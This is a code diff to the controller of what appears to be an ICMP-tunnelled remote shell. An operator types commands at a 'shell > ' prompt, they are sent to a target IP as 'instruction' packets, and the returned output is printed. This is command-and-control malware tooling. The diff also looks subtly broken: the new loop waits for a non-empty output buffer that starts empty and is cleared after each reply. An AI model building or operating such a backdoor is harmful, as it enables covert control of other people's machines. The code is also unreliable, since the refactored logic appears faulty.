@@ -14,7 +14,7 @@ import argparse
 from multiprocessing import Process, Manager
 
 manager = Manager()
-wait = manager.Value(bool, False)
+mock_stdout = manager.Value(str, "")
 
 TTL = int(64)
 ICMP_ID = int(12800)
@@ -24,7 +24,6 @@ class Controller(Host):
     def __init__(self):
         super().__init__()
         self.db = TinyDB('./db.json')
-        self.mock_stdout = ""
 
 
     def list_hosts(self):
@@ -49,10 +48,8 @@ class Controller(Host):
         sniffer.start()
 
         while True:
-            if not wait.value:
+            if len(mock_stdout.value) != 0:
                 cmd = input(colored("shell > ", "red")).encode()
-                wait.value = True
-                print(wait.value)
                 if len(cmd) != 0:
                     self.send(target['ip'], "instruction", cmd)
                     
@@ -60,21 +57,15 @@ class Controller(Host):
 
     def instruction(self, shellpack):
         if shellpack['option'] == "TRUNCATED":
-            self.mock_stdout += shellpack['data'].decode()
+            mock_stdout.value += shellpack['data'].decode()
         elif shellpack['option'] == "COMPLETE":
-            self.mock_stdout += shellpack['data'].decode()
-            print(self.mock_stdout)
-            self.mock_stdout = ""
-            wait.value = False
-            print(wait.value)
+            mock_stdout.value += shellpack['data'].decode()
+            print(mock_stdout.value)
+            mock_stdout.value = ""
         elif shellpack['option'] == "ERROR":
             print(f"[ERROR] {shellpack['data'].decode()}")
-            wait.value = False
         else:
             print(f"{shellpack['data'].decode()}")
-            wait.value = False
-            print(wait.value)
-        
 
 if __name__ == "__main__":
     controller = Controller()
